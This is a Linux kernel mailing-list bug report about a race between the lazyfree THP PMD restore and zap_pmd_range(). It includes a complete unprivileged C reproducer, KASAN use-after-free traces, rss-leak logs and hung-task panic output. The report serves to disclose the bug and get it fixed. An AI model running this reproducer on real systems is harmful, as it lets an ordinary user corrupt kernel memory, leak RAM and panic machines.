Return-Path: <owner-linux-mm@kvack.org>
X-Spam-Checker-Version: SpamAssassin 3.4.0 (2014-02-07) on
	aws-us-west-2-korg-lkml-1.web.codeaurora.org
Received: from kanga.kvack.org (kanga.kvack.org [205.233.56.17])
	(using TLSv1 with cipher DHE-RSA-AES256-SHA (256/256 bits))
	(No client certificate requested)
	by smtp.lore.kernel.org (Postfix) with ESMTPS id 9CCC0CCF2C7
	for <linux-mm@archiver.kernel.org>; Sat, 17 Oct 2026 14:15:27 +0000 (UTC)
Received: by kanga.kvack.org (Postfix)
	id DA8C76B0088; Sat, 17 Oct 2026 10:15:25 -0400 (EDT)
Received: by kanga.kvack.org (Postfix, from userid 40)
	id D80686B008A; Sat, 17 Oct 2026 10:15:25 -0400 (EDT)
X-Delivered-To: int-list-linux-mm@kvack.org
Received: by kanga.kvack.org (Postfix, from userid 63042)
	id C48316B008C; Sat, 17 Oct 2026 10:15:25 -0400 (EDT)
X-Delivered-To: linux-mm@kvack.org
Received: from relay.hostedemail.com (smtprelay0011.hostedemail.com [216.40.44.11])
	by kanga.kvack.org (Postfix) with ESMTP id 86F4E6B0088
	for <linux-mm@kvack.org>; Sat, 17 Oct 2026 10:15:25 -0400 (EDT)
Received: from smtpin29.hostedemail.com (lb01a-stub [10.200.18.249])
	by unirelay04.hostedemail.com (Postfix) with ESMTP id 07B501A02EA
	for <linux-mm@kvack.org>; Sat, 17 Oct 2026 14:15:25 +0000 (UTC)
X-FDA: 85332315810.29.AF7B3CD
Received: from mail-ed1-f46.google.com (mail-ed1-f46.google.com [209.85.208.46])
	by imf30.hostedemail.com (Postfix) with ESMTP id 053028000A
	for <linux-mm@kvack.org>; Sat, 17 Oct 2026 14:15:22 +0000 (UTC)
Authentication-Results: imf30.hostedemail.com;
	dkim=pass header.d=gmail.com header.s=20251104 header.b=ZWTOqOqE;
	spf=pass (imf30.hostedemail.com: domain of malhyuk97@gmail.com designates 209.85.208.46 as permitted sender) smtp.mailfrom=malhyuk97@gmail.com;
	dmarc=pass (policy=none) header.from=gmail.com;
	arc=pass ("google.com:s=arc-20260327:i=1")
ARC-Message-Signature: i=2; a=rsa-sha256; c=relaxed/relaxed; d=hostedemail.com;
	s=arc-20220608; t=1792246523;
	h=from:from:sender:reply-to:subject:subject:date:date:
	 message-id:message-id:to:to:cc:cc:mime-version:mime-version:
	 content-type:content-type:content-transfer-encoding:in-reply-to:
	 references:dkim-signature; bh=JE1guI3O3kSP/TuUnkfOPlKsvCPadRVNkbtm7A1+xlo=;
	b=taNdFjepTCqVPI4Be9YtJhQmd01O6P6lW0ApTRB7DK7bjIzMr5ndxuZrgeEkEZEtYz2pew
	BatJ0ac6Kx/Mi7N9HIH/yJgz8Y4h2B8HJ7W+UHK7b3WPfd78h8kXNTmZP8GwwINRqUKu2j
	JcJZgeELLAIH4UObkzE6jPN0Y04jC8E=
ARC-Seal: i=2; a=rsa-sha256; d=hostedemail.com; s=arc-20220608; cv=pass;
	t=1792246523;
	b=SpeKV1Q5oUI/p/g5z4rTAseRzJV7ELbIhat97VEo7Mgnn2JdhYB92HAvzFhgIB9Pgxm+E4
	hNH/gdZpnmr6IH69/ujxKUHgGwICvCEs3fheRTNoJKolm9JQzcoadjLyd3wqMd+pcJx5kw
	BeO6M5hCgYDCn66bTYqtgo3uLitK6NE=
ARC-Authentication-Results: i=2;
	imf30.hostedemail.com;
	dkim=pass header.d=gmail.com header.s=20251104 header.b=ZWTOqOqE;
	spf=pass (imf30.hostedemail.com: domain of malhyuk97@gmail.com designates 209.85.208.46 as permitted sender) smtp.mailfrom=malhyuk97@gmail.com;
	dmarc=pass (policy=none) header.from=gmail.com;
	arc=pass ("google.com:s=arc-20260327:i=1")
Received: by mail-ed1-f46.google.com with SMTP id 4fb4d7f45d1cf-6b1b13e09ffso878241a12.3
        for <linux-mm@kvack.org>; Sat, 17 Oct 2026 07:15:22 -0700 (PDT)
ARC-Seal: i=1; a=rsa-sha256; t=1792246521; cv=none;
        d=google.com; s=arc-20260327;
        b=qmTrl/WYKYGow6fROtKD6NRZabkfYcvyyajiRXYvTbp7m8mi34QKGDMv1BJukOfg5P
         a3tc1hemEJ2ZsuTvbYeuQbLR5052MDWSf+B72QzvMa5r8sx7IxpQjqH7GYN0FmYptttL
         YhckUs5xNfqzMu6yMdEHHh0MpgHy0dQxOduzXwM5USVO8tCEKYNBxDxsHaVUERnM1w3W
         KUi33iOdjbyDk6gcwfu/XhzoZBTTtQMN0BsrVApSoTlXI7SMqJGOLnZOUdP9iSFQ/k0s
         v8C94brz5wtUv4ZVlSEx3GWg308Tkws0xf3ZZk7Mf71fAtAyleJLTTd5qXm4538tnK7H
         0UBQ==
ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed; d=google.com; s=arc-20260327;
        h=cc:to:subject:message-id:date:from:mime-version:dkim-signature;
        bh=JE1guI3O3kSP/TuUnkfOPlKsvCPadRVNkbtm7A1+xlo=;
        fh=uVrVXmqEMxJDy6yf+UlkjXCXrSwsWIU4dvkTZlCijTQ=;
        b=hDSW3XWp8hGNupRMsFj/cZqdPPpoCTUd9/xicynfaxBL3YqJRjiU/sF9lS8iWIq+59
         uyUSVHnKTbkrgpMTXY8LgCd4FtTVXgSI9uc+4PNtSFtmxoHFbrvuGwyytoYHtm/1vU/t
         8JdFMipQOp8Iz83SNZ6+wTIXhjbDfiJ6OC/dtAzUpT0fGb2nxPG5fI2ONzQSauf7CKMS
         ibCQ6tWWBxBUKSLKgUksyCJD44Z28/IqejEHBeGltskCrwhdwM3+VYKKyqPfo8vV+zsZ
         8GtVF5i+nHIjuVH2x+L0NvgnlbazEdDZ9yAoRCDdI4B7jbwglN3XpTqTZunAxWSp/2nL
         cMkA==;
        darn=kvack.org
ARC-Authentication-Results: i=1; mx.google.com; arc=none
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=gmail.com; s=20251104; t=1792246521; x=1792851321; darn=kvack.org;
        h=content-type:cc:to:subject:message-id:date:from:mime-version:from
         :to:cc:subject:date:message-id:reply-to:content-type;
        bh=JE1guI3O3kSP/TuUnkfOPlKsvCPadRVNkbtm7A1+xlo=;
        b=ZWTOqOqEmNT/PGc8g+3myRUcntgVNenuEY29lx+JG/4BYuWgJRwxTZ79v9Dlwb+Ebs
         w79JuaE0ooTw7Do1QgtYgsGGCsmN/CeaiioXUtRdYmoKk4+o4CwT2jfEAmrN7LAkBxTj
         mfhqPZgireKjhYuG3OohQnz+w4/D6+UKuFfhbgpPadC4n1F9EN37GXN/BE7guJiDuCFk
         eXnN8HYRF3dfYE289XHQl4r414+cDANV0uPjY+dxrYrXM7rp0IKqkJWTuy/+Fto/7GiB
         jJlkFUR7mY5sU2R5IJSePZyjl4Y+vPj2psl307JO8KtkzHxU+prY5af+wCggpmgIi4H0
         nnYA==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20260707; t=1792246521; x=1792851321;
        h=content-type:cc:to:subject:message-id:date:from:mime-version
         :x-gm-gg:x-gm-message-state:from:to:cc:subject:date:message-id
         :reply-to:content-type;
        bh=JE1guI3O3kSP/TuUnkfOPlKsvCPadRVNkbtm7A1+xlo=;
        b=JM93DmrvTwGUY7Y3sC7elj8XTH69Q3o9OQuqek1Km0GIhMbxUfP1Hb8QTfyOXyS0Dq
         OKi84kGFXrQlzjoFEE3nTrzKEWuCu2w+1JndjuQhW1nQ5r8gTddH3Q/GxJmzcpPGZla+
         iZ8GODZe4vNDtnQvku80OgCJFTFtvSQnth2RT9Q6/55GS+G5SN8QXL/uHhF4LQADh0G8
         IZ2qEgAxPXWb2ghBOPTJT3IpvBToFSKyLIPNcokpQ61MqGB2JCU+X4WPCqp8Vnl0LDLH
         vsMTc5PurMz5kM95bREkmOMhjIlqYBebdqL/h1HATImfIM8jgmh63YqjTC3ZpYL5M0Nb
         tY4w==
X-Forwarded-Encrypted: i=1; AKwUvBxI6GaRLPBRSYS3Fhx1VCIJ1c4nZLD6L62XrKmKV5UMh5mGtIHXrqiu5l4uZGugzgPrJAV4qL47Vg==@kvack.org
X-Gm-Message-State: AFq9FYKidKuCWd+uO6BHYImTAWCVN+43k6FttwnqdHHdM1mYjxn7M3Xy
	7VoYPpTb30CeIwbNrMM43t5EzHUg0vV+bSv3Ft5ANJS2ZRH6629YjJQfrpb0gsxm3IRgcpC+BnY
	TOUh5L2JxJPKtPF0qfJzwSdUxqmlLAA==
X-Gm-Gg: AYBFou3xnWqKvpuADQ96+oSALXrC7koItthj/zOWdQVxSdH8NPBswxVmkDdKzA108Kp
	AdXR1zwXMZEIXcFd3fqlVeZLte+F9PanHyJRZJJR+1jqCOMMB81IgUvofdNu/7YLZ4hQ2RQC3lA
	IsDWCmHsHAPiTGiYvu1Lf4RMww4SUE8YsNOqfGaz+C3ks5fx+CcRLtNhY33TahPPgefzww3Vayb
	Atax+TuxvrWr7J+OqahjbOURbF1iTz4D1GL51+ZAzEiqWWnn9QOo/8sfKFVGtcSPl9P8BA4nV6x
	uEswe3AKshIPWQSdRgk70Fffh2nP5IzbLf+MDskcyiUZumD21YOCLAS72PjpkzFpRt8Ii4fHXby
	q76a9Vun6J12aM1M4CQle5pZTRo271a3OeCS8z7E=
X-Received: by 2002:a05:6402:3054:20b0:6b1:c265:a5ad with SMTP id
 4fb4d7f45d1cf-6b3a81d2e56mr1196855a12.32.1792246521055; Sat, 17 Oct 2026
 07:15:21 -0700 (PDT)
Received: from 101988054943 named unknown by gmailapi.google.com with
 HTTPREST; Sat, 17 Oct 2026 09:15:19 -0500
Received: from 101988054943 named unknown by gmailapi.google.com with
 HTTPREST; Sat, 17 Oct 2026 09:15:19 -0500
MIME-Version: 1.0
From: =?UTF-8?B?6rmA7KKF7ZiB?= <malhyuk97@gmail.com>
Date: Sat, 17 Oct 2026 09:15:19 -0500
X-Gm-Features: AclHuK_8Xz2Uutk9-Z2C2-FA2Y-odEtzZc3pXXWp3XJq2XyY_A2KwfEwo3s3nv8
Message-ID: <CADQRuqvXOS9J9ebFpRf0dkFPwPvtWBR=fHWNb1oYMQwQ0X7_gw@mail.gmail.com>
Subject: [BUG] mm/huge_memory: lazyfree THP PMD restore races zap_pmd_range
To: akpm@linux-foundation.org, david@kernel.org, lance.yang@linux.dev, 
	linux-mm@kvack.org
Cc: linux-kernel@vger.kernel.org
Content-Type: multipart/alternative; boundary="0000000000003cd391065e09e9cf"
X-Rspam-User: 
X-Rspamd-Queue-Id: 053028000A
X-Stat-Signature: wnybbmkz76jakqythtifry8qpmbtfehe
X-Rspamd-Server: rspam05
X-HE-Tag: 1792246522-901545
X-HE-Meta: U2FsdGVkX1/5V/d1uE4bo3MrJmwHkQH2f9wcB9QLrM3giormFn+5TTkvqvSYLL3O99NWCLMW+HtNe0yGj3S7WlBNTjwQ6EXjKRcyusM4IFddvHMkQwyk22KMGEfwzJaFFCugASWG6KLVi1e/QcQQW6arwpet0QnORqvXYiEpfX++3XKMtf3J00rCxnS8zckxmLQ+1nBjM9gmllquYj+Lr/EeBvpB5eXfx623NsRbaza0nPMub1dSHCP2Y8zKDdMnceYbEOaQC6cnrHPlMkJyEvYN+Mkn2NZYMgE/xJAYxQLN3L7oEB8dLF/C0rUaZ+ocUGE+Kf7dw4pFgveqDE8BI2g0rtP808R1CH+NmSijJhWd3lr2QSdPZHgjklVq5rsVi5O2ZJC26hMyjdJedbCp6grFyHhQsTlkqnFOfjxYOKgdbThDnNjy0rOsS1F11grMA1pHI44otv2f9NgtTy51AVaZbIotlWEzT0/3Zw9YpjnDGFhxqCy66CZiiab0+Kn6zsa+OL2kck+xqHdH+40ovqCQ5h4fibyvVS1ysNaGjDYfIyUC9qNua2qQlwPY7euTUxd2dR3yh7vH607G3Hy17YLTIrsneXr4XwMLrcjxPyoAPFfCsfh0CTpthLMKp9OSJpMUSjfopJIp15qi2gW7K+8OeU10h44lhKtjp0G+pOvdUSYPoLO0rf9a67ipbY76iOtKaJ6ciK2bgE7cPee8HGmEQ+Z2ImFH0BygpTJTlTkOkLFpF61s7F6Bosdt2FfZZbHWwiJJyX+GQEeWYGignVSmUryoct5DjJ+z5S5ZKVyENhbISY3/98WzIWlHdcaf815L6YkkNB5ToWkUd3j067rhdDfN7jiRzgw4LMS8Od3u2lDVL6UND8e/ePqcwCh+XNFp4L/rPHx4kFG907czMBzYATaZYQFhSsb4J7KwP8y73wumAM2oflyLxAjpDweQqu0KB+vfuNAAIU/rLXo
 buFz2AHu
 QvYIKjsbPkA94ucQd9/8qAoFQYJaWjXsxznIzQMahmPB76n7BNN6vgBISzCfQKNs7aqSf9qwso75t4eD+XhWyJJDI0YawJ4iiKVfgaU41RsFfwyvRxDuNwT0RIwkZXCW46/N+7h+4NO1Ys3MqxoSUVQQOP92YfPY3eVnMOHdRzcFj6Hk7nqtI8BFFfJ5HiyMRIpTiFp82mJFUhiA9WwNDFFwYfootfH8qcZu7yEPf1JcA9VbNIf+dU3CAaI/lBsaxS0eVUpDJQKpEIfzfMgs1VnRPYEirAdtA9xiC9OYOnsWpbs1wUKrE5EMMPtiq7fWkWmpEX14C5zIhr+KRnFrlVrjIcBj1f5EM9P6EQSdsatSwS975DSRBQfUQD808i9q3K6PuWi1eJxopNkpriEuz/HrqDrrw69mnYI1XsW34pKJ8E9QlYSNfEmA93PfzIrFuhrWjzGRQAQ4CDEgl8sps6oFT0shGGVCsWgDfm5dQiZvDwzTupyowoK+gbW+kmM79cwtH3X5QnY+FZyr0eNtgGC8I5vqgjvE2QckG1a061JKX6aQ4tVxqBbIFVJ8yKNEWePElK78COsZXo5PrnmAO7vUSDaUrJxgF9iiqgXW+eLeR7LCPML/Z+f005YZuoXj4Q/xT
Sender: owner-linux-mm@kvack.org
Precedence: bulk
X-Loop: owner-majordomo@kvack.org
List-ID: <linux-mm.kvack.org>
List-Subscribe: <mailto:majordomo@kvack.org>
List-Unsubscribe: <mailto:majordomo@kvack.org>

--0000000000003cd391065e09e9cf
Content-Type: text/plain; charset="UTF-8"

Hi,

__discard_anon_folio_pmd_locked() clears the PMD of a lazyfree
PMD-mapped anon THP with pmdp_huge_clear_flush() and puts it back with
set_pmd_at() when it turns out the folio cannot be discarded. The only
lock it shares with a concurrent unmap is the pmd lock. zap_pmd_range()
tests pmd_none(*pmd) without that lock for every caller except
unmap_mapping_folio(), so a munmap() or an exiting mm that lands in the
window skips the whole 2 MB range. The restore then reinstalls the PMD
into a VMA that is about to go away. Nothing updates the folio's rmap
or the mm counters, so the folio stays mapped forever, and
folio->mapping keeps pointing at an anon_vma that unlink_anon_vmas()
frees a moment later. Reclaim dereferences that pointer on every
later pass over the folio, for the rest of the boot.

I hit this as an ordinary user (uid 1000, no capabilities, no
namespaces) on a stock v6.12.112 build. The code is the same in 7.2 and
in mainline. If this is already known, sorry for the noise.


How to reproduce
================

/*
* Lazyfree PMD-mapped THP discard restore vs lockless zap_pmd_range().
* Build: gcc -O2 -static -pthread -o repro repro.c
* Run as an ordinary user, no arguments, then watch dmesg. On a KASAN kernel
* (CONFIG_SLUB_RCU_DEBUG=y) expect slab-use-after-free in
* folio_lock_anon_vma_read() within 30 s to 5 min; on a plain kernel expect
* "BUG: Bad rss-counter state ... MM_ANONPAGES" within a couple of minutes.
*/
#define _GNU_SOURCE
#include <fcntl.h>
#include <pthread.h>
#include <signal.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/uio.h>
#include <sys/wait.h>
#include <unistd.h>

#ifndef MAP_DROPPABLE
#define MAP_DROPPABLE 0x08
#endif

#define PMD (2UL << 20)
#define NR_PMDS 16
#define NR_THREADS 3
#define GEN_SECS 60
#define CHUNK (16UL << 20)

static void oom_adj(const char *val)
{
int fd = open("/proc/self/oom_score_adj", O_WRONLY);

if (fd < 0)
return;
if (write(fd, val, strlen(val)) < 0) {
}
close(fd);
}

static void *racer(void *arg)
{
unsigned int seed = (unsigned int)(unsigned long)arg * 7919 + getpid();
size_t len = (NR_PMDS + 1) * PMD;

for (;;) {
char *r, *a;
int i, p[2];

r = mmap(NULL, len, PROT_READ | PROT_WRITE,
MAP_DROPPABLE | MAP_ANONYMOUS, -1, 0);
if (r == MAP_FAILED) {
usleep(1000);
continue;
}
a = (char *)(((unsigned long)r + PMD - 1) & ~(PMD - 1));

madvise(a, NR_PMDS * PMD, MADV_HUGEPAGE);
for (i = 0; i < NR_PMDS; i++)
a[i * PMD] = 1;
madvise(a, NR_PMDS * PMD, MADV_FREE);

if (pipe(p) == 0) {
fcntl(p[1], F_SETPIPE_SZ, 65536);
for (i = 0; i < NR_PMDS; i++) {
struct iovec v = { a + i * PMD + 8192, 4096 };

vmsplice(p[1], &v, 1, 0);
}
} else {
p[0] = p[1] = -1;
}

usleep(rand_r(&seed) % 20000);
munmap(r, len);
if (p[0] >= 0) {
close(p[0]);
close(p[1]);
}
}
return NULL;
}

static void racer_proc(void)
{
pthread_t t;
long i;

oom_adj("-1000");
for (i = 0; i < NR_THREADS; i++)
pthread_create(&t, NULL, racer, (void *)i);
sleep(GEN_SECS);
_exit(0);
}

static void pressure_proc(void)
{
unsigned long total = 0, n, i, off;
char line[256];
char **ring;
FILE *f;

oom_adj("1000");
f = fopen("/proc/meminfo", "r");
while (f && fgets(line, sizeof(line), f))
sscanf(line, "MemTotal: %lu kB", &total);
if (f)
fclose(f);
if (!total)
total = 1UL << 20;

n = (total << 10) / CHUNK + 8;
ring = calloc(n, sizeof(*ring));
if (!ring)
_exit(1);

for (i = 0;; i = (i + 1) % n) {
if (ring[i])
munmap(ring[i], CHUNK);
ring[i] = mmap(NULL, CHUNK, PROT_READ | PROT_WRITE,
MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
if (ring[i] == MAP_FAILED) {
ring[i] = NULL;
continue;
}
madvise(ring[i], CHUNK, MADV_NOHUGEPAGE);
for (off = 0; off < CHUNK; off += 4096)
ring[i][off] = 1;
}
}

int main(void)
{
pid_t racer_pid, pressure_pid, died;

printf("uid %d: racing, watch dmesg\n", (int)getuid());
fflush(stdout);

racer_pid = fork();
if (!racer_pid)
racer_proc();
pressure_pid = fork();
if (!pressure_pid)
pressure_proc();

for (;;) {
died = wait(NULL);
if (died < 0)
break;
if (died == racer_pid) {
racer_pid = fork();
if (!racer_pid)
racer_proc();
} else if (died == pressure_pid) {
pressure_pid = fork();
if (!pressure_pid)
pressure_proc();
}
}

kill(racer_pid, SIGKILL);
kill(pressure_pid, SIGKILL);
return 0;
}

One self-contained C file, nothing beyond libc, no arguments, run as a
normal user:

gcc -O2 -static -pthread -o repro repro.c
./repro

What it does. Three threads loop:

mmap 34 MB anon, align to 2 MB
madvise(MADV_HUGEPAGE) on 16 PMDs, write one byte in each
madvise(MADV_FREE) on all 16
vmsplice() one 4 KB page out of each THP into a pipe that stays open
sleep 0 to 20 ms
munmap()

and one more process allocates and touches a ring of 16 MB chunks whose
total is a little over MemTotal, so it stays in the reclaim slowpath
instead of settling at some comfortable fraction of memory. It gets
OOM-killed now and then and is restarted. The vmsplice pin is the
point of the whole thing: it makes ref_count != map_count + 1, so the
discard fails and takes the set_pmd_at() restore path.

The process holding the racer threads exits and is restarted every 60 s
with its mappings still in flight, so exit_mmap() runs the same race as
the munmap() in the loop. Both sides show up in what follows.

The regions are mapped with MAP_DROPPABLE. That is not needed for the
leak, plain MAP_PRIVATE plus MADV_FREE leaks exactly the same way. It
matters only for making the use-after-free visible on a guest with no
swap: after a failed discard, try_to_unmap_one() sets swapbacked on the
folio (mm/rmap.c:1910-1911) unless the VMA is VM_DROPPABLE, and a
swapbacked folio sits on the anon LRU, which reclaim does not scan when
there is no swap (can_reclaim_anon_pages(), mm/vmscan.c:338-360, used at
:2406). With MAP_DROPPABLE the leaked folio stays on the file LRU and
reclaim keeps walking it. On a machine with swap I would expect the
plain MADV_FREE case to be revisited too, but I have not tested that.

Guest: qemu, 2 vCPUs, KVM, no swap, THP enabled=madvise,
transparent_hugepage/defrag=madvise, single node. 1 GB for the plain
kernel and 5 GB for the KASAN kernel. The test ran as uid 1000 from a
minimal initramfs.

On the KASAN build the report comes out between 30 s and 264 s of
uptime; 6 of 7 five-minute boots produced it. On the plain build I let
it run for 20 minutes.


What the code does
==================

Line numbers below are v6.12.113 unless stated otherwise.

Reclaim side:

shrink_folio_list() calls try_to_unmap() with TTU_SPLIT_HUGE_PMD and
TTU_SYNC for large folios (mm/vmscan.c:1305-1326).

try_to_unmap_one(), with pvmw.pte == NULL, calls
unmap_huge_pmd_locked() (mm/rmap.c:1700-1703) under the pmd lock taken
by page_vma_mapped_walk().

For an anon folio that is not swapbacked that reaches
__discard_anon_folio_pmd_locked() (mm/huge_memory.c:3009). The PMD is
cleared at :3020 by pmdp_huge_clear_flush(), which includes the TLB
flush IPI round trip, and is put back at :3047 when the folio is dirty
or ref_count != map_count + 1.

Locks held across that window: the folio lock, the anon_vma read lock
from rmap_walk_anon_lock(), and the pmd lock. Not mmap_lock.

Unmap side, zap_pmd_range() (mm/memory.c:1703-1743):

:1714 is_swap_pmd(*pmd) || pmd_trans_huge(*pmd) || pmd_devmap(*pmd)
is read without the pmd lock and is false while the PMD is
cleared, so this arm is skipped.
:1722 the lock-and-drop that exists for exactly this class of race
only runs for details->single_folio, that is, for
unmap_mapping_folio(). unmap_vmas() fills in details at
mm/memory.c:1885-1889 and never sets single_folio, so munmap
and exit do not take the pmd lock here.
:1733 if (pmd_none(*pmd)) { addr = next; continue; }
and the 2 MB range is gone for good.

The PTE-level version of the same hazard is already documented in the
tree: see the TTU_SYNC comment at mm/vmscan.c:1311-1324, and note that
the PTE lazyfree restore is safe only because zap_pte_range() takes the
ptl. The other PMD clear/restore sites do not have this problem:
khugepaged holds mmap_lock for write, and madvise_free_huge_pmd(),
change_huge_pmd(), the anon split and set_pmd_migration_entry() use
pmdp_invalidate(), which leaves the entry non-none.

After the skip:

The restore at mm/huge_memory.c:3047 reinstalls the PMD. On 6.12,
TTU_SPLIT_HUGE_PMD then splits it (mm/rmap.c:1705-1714), leaving 512
present PTEs in a table that free_pte_range() frees without zapping.
On 7.2 and 7.3 try_to_unmap_one() goes to walk_abort instead, the leaf
PMD survives, and free_pmd_range() clears it through
pmd_none_or_clear_bad(), printing "bad pmd".

Either way nothing drops the folio's mapcount or refcount and nothing
corrects the mm counter, so check_mm() reports the rss leak at
teardown (kernel/fork.c:847) and the folio is never freed.

free_pgtables() (mm/memory.c:365-419) calls unlink_anon_vmas() at :389
and :410, before free_pgd_range() at :414, so the anon_vma is freed
first while folio->mapping still points at it.

On every later reclaim pass over the folio,
folio_lock_anon_vma_read() (mm/rmap.c:551) reads folio->mapping at
:560; the folio_mapped() early-out at :563 cannot fire because the
mapcount is leaked; :567 reads anon_vma->root out of the freed object
and :568 runs down_read_trylock() on the rwsem at whatever address
that is; rmap_walk_anon() then walks the freed interval tree.

Affected trees. The discard path came in with 735ecdfaf4e80
("mm/vmscan: avoid split lazyfree THP during shrink_folio_list()"),
first released in v6.11. Both sides of the race are there in all three
trees I looked at:

v6.12.113 mm/huge_memory.c:3009 (clear :3020, restore :3047)
mm/rmap.c:1700, folio_lock_anon_vma_read() at :551
mm/memory.c:1703 (pmd_none at :1733), free_pgtables :365
v7.2-rc5 mm/huge_memory.c:3399 (clear :3414, restores :3443, :3448)
mm/rmap.c:2072, folio_lock_anon_vma_read() at :633
mm/memory.c:1992 (pmd_none at :2016), free_pgtables :373
v7.3-rc7 mm/huge_memory.c:3557 (clear :3572, restores :3601, :3606)
mm/rmap.c:2279, folio_lock_anon_vma_read() at :637
mm/memory.c:2123 (pmd_none at :2147), free_pgtables :373

In 7.2 and 7.3 the single_folio lock-and-drop became
sync_with_folio_pmd_zap() (mm/internal.h:587-603 in v7.3-rc7, called
from mm/memory.c:2145), still only for the single_folio case.

Tested on v6.12.112.


What I saw
==========

1) KASAN, v6.12.112 with the kernelCTF release KASAN config
(CONFIG_KASAN_GENERIC=y, CONFIG_SLUB_RCU_DEBUG=y), 5 GB, 2 vCPUs,
reproducer running as uid 1000. Report at 30.5 s of uptime, "?" lines
dropped from the traces, everything else verbatim (the release image
reports itself as 6.12.112-dirty):

[ 30.523383] BUG: KASAN: slab-use-after-free in
folio_lock_anon_vma_read+0x57e/0x640
[ 30.524689] Read of size 8 at addr ffff88802c791660 by task
exp_l1_trigger/126
[ 30.526106] CPU: 0 UID: 1000 PID: 126 Comm: exp_l1_trigger Not tainted
6.12.112-dirty #1
Call Trace:
kasan_report+0xce/0x100
folio_lock_anon_vma_read+0x57e/0x640
rmap_walk_anon+0x349/0x570
folio_referenced+0x1e8/0x410
shrink_active_list+0x439/0xbc0
shrink_lruvec+0x145f/0x3000
shrink_node+0x82f/0x34b0
do_try_to_free_pages+0x311/0x1a20
try_to_free_pages+0x1d7/0x420
__alloc_pages_slowpath.constprop.0+0x79b/0x2680
__alloc_pages_noprof+0x4fd/0x7a0
alloc_pages_mpol_noprof+0x1bd/0x430
pte_alloc_one+0x1d/0x120
do_huge_pmd_anonymous_page+0x339/0x1b20
__handle_mm_fault+0xf9c/0x1260
handle_mm_fault+0x41e/0xb90
do_user_addr_fault+0x25d/0xb00
exc_page_fault+0x71/0xe0
asm_exc_page_fault+0x26/0x30

Allocated by task 128:
kmem_cache_alloc_noprof+0x10e/0x2a0
__anon_vma_prepare+0x2e5/0x550
__vmf_anon_prepare+0x15c/0x2a0
do_huge_pmd_anonymous_page+0x120/0x1b20
__handle_mm_fault+0xf9c/0x1260
handle_mm_fault+0x41e/0xb90
do_user_addr_fault+0x25d/0xb00
exc_page_fault+0x71/0xe0

Freed by task 126:
__kasan_slab_free+0x37/0x50
slab_free_after_rcu_debug+0xc8/0x2d0
rcu_core+0x6fc/0xee0
handle_softirqs+0x1a2/0x570
__irq_exit_rcu+0xae/0xf0
sysvec_apic_timer_interrupt+0x71/0x90

Last potentially related work creation:
kmem_cache_free+0x236/0x4b0
__put_anon_vma+0x74/0x210
unlink_anon_vmas+0x43c/0x6f0
free_pgtables+0xf7/0x890
vms_clear_ptes+0x497/0x6e0
vms_complete_munmap_vmas+0x1aa/0x740
do_vmi_align_munmap+0x2c9/0x4b0
do_vmi_munmap+0x154/0x2d0
__vm_munmap+0x1fc/0x3e0
__x64_sys_munmap+0x59/0x80
do_syscall_64+0x58/0x120

The buggy address belongs to the object at ffff88802c791660
which belongs to the cache anon_vma of size 96
The buggy address is located 0 bytes inside of
freed 96-byte region [ffff88802c791660, ffff88802c7916c0)

Offset 0 of the object is anon_vma->root. The allocating stack is the
THP fault that created the anon_vma, the freeing stack is munmap() ->
free_pgtables() -> unlink_anon_vmas() -> __put_anon_vma(), and the
reader is direct reclaim running inside the page fault path of a uid
1000 task. SLUB_RCU_DEBUG is what makes KASAN willing to
report it for a SLAB_TYPESAFE_BY_RCU cache; without it the same read
silently lands on a recycled anon_vma or on recycled memory.

On a locally built v6.12.112 (official config plus KASAN,
DEBUG_OBJECTS and FAILSLAB, PANIC_ON_OOPS off so later reports stay
visible) one boot gave the same KASAN report at 57.8 s and then this at
291.5 s, which is the recycled-memory case:

[ 291.490162] Oops: general protection fault, probably for non-canonical
address 0x800000003372086f
[ 291.502418] RIP: 0010:down_read_trylock+0x7e/0x160
Call Trace:
folio_lock_anon_vma_read+0xad/0x320
rmap_walk_anon+0x249/0x300
folio_referenced+0x189/0x2c0
shrink_active_list+0x342/0x770

0x800000003372086f in the root slot has the shape of an x86 PTE (NX
set, low bits 0x86f), so by then the anon_vma slab page had been
returned to the page allocator and reused. That reading is mine and is
not proven.

2) The leak as it shows without any debug option. Same reproducer on
the plain v6.12.112 release build (no KASAN), 1 GB, 2 vCPUs, 20 minutes.
17 reports from check_mm(), all MM_ANONPAGES left positive, each value a
multiple of 512 pages, one THP each:

[ 62.644293] BUG: Bad rss-counter state mm:00000000eb31e2e8
type:MM_ANONPAGES val:1024
[ 369.842397] BUG: Bad rss-counter state mm:00000000a829ff5a
type:MM_ANONPAGES val:2560
[ 1026.747257] BUG: Bad rss-counter state mm:0000000098413e7a
type:MM_ANONPAGES val:4096

The 17 reports add up to 20480 pages, that is 40 THPs, 80 MB on a 1 GB
machine in 20 minutes. None of it comes back: the mapcount never drops
to zero, so the folio is never freed. I checked that part on a KASAN
guest by killing the racers, leaving only the memory pressure running
for another 17 minutes, and counting mapped KPF_ANON|KPF_THP pages
through /proc/kpagecount and /proc/kpageflags with no user mapping left
anywhere: 21 leaked 2 MB folios when the racers died and the same 21 at
the end. On the MAP_DROPPABLE guest the 11 leaked heads kept flipping
their LRU active bit between scans, so reclaim was walking them the
whole time.

3) Hung-task panic, plain v6.12.112 release build, same 20 minute run,
at 1230 s. Two tasks blocked for more than 122 s, both taking the
anon_vma root rwsem for write in unlink_anon_vmas() under
free_pgtables(), one from munmap() and one from exit_mmap(). The
official config has CONFIG_BOOTPARAM_HUNG_TASK_PANIC=y, so the machine
panicked. Traces trimmed the same way:

[ 1230.003911] INFO: task exp_l1_trigger:1279 blocked for more than 122
seconds.
[ 1230.011380] task:exp_l1_trigger state:D stack:0 pid:1279 tgid:1278
ppid:124
Call Trace:
rwsem_down_write_slowpath+0x1e4/0x5d0
down_write+0x32/0x40
unlink_anon_vmas+0xb5/0x1d0
free_pgtables+0x85/0x270
vms_clear_ptes+0x144/0x160
vms_complete_munmap_vmas+0x65/0x190
do_vmi_align_munmap+0x15e/0x1d0
do_vmi_munmap+0xc3/0x170
__vm_munmap+0xca/0x190
__x64_sys_munmap+0x1b/0x30

[ 1230.054660] INFO: task exp_l1_trigger:1360 blocked for more than 122
seconds.
Call Trace:
rwsem_down_write_slowpath+0x1e4/0x5d0
down_write+0x32/0x40
unlink_anon_vmas+0xb5/0x1d0
